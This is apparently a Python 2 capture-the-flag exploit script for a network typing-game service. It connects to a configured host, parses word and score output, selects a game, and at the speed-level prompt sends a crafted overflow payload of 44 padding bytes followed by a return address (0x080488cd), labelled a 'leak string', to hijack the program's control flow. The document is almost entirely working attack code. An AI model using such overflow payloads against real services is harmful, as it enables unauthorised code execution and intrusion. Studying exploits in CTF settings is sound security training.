import socket
import re
import config

def get_word(data):
    word = None
    word_regexp = re.compile(r'[^Score:\s\d{1,}]([a-zA-Z0-9]+)')
    found = word_regexp.search(data)
    if found:
        word = found.group(1)
    else:
        pass
    return word

def get_score(data):
    score = None
    score_regexp = re.compile(r'Score:\s(\d{1,})')
    found = score_regexp.search(data)
    if found:
        score = int(found.group(1))
    else:
        pass
    return score

def main():
    playing = True
    is_game_over = False
    lastScore = 0

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_address = (config.HOST, config.PORT)
    print 'connecting to %s port %s' % server_address
    sock.connect(server_address)

    while True:
        data = sock.recv(1024)
        if data:
            print data
        if '=====Magic Type Menu=====' in data and playing:
            print "[*] Play a game!"
            sock.sendall('1\r\n')
        if 'Choose the speed level' in data and playing:
            print "[*] Choose speed level at " + str(config.LEVEL) + '!'
            leakstring =  'a' * 44 + '\xcd\x88\x04\x08\r\n'
            print '[*] Send a leak string to server', repr(leakstring)
            sock.sendall(leakstring)

    print 'Close the socket!'
    sock.close()

if __name__ == '__main__':
    main()
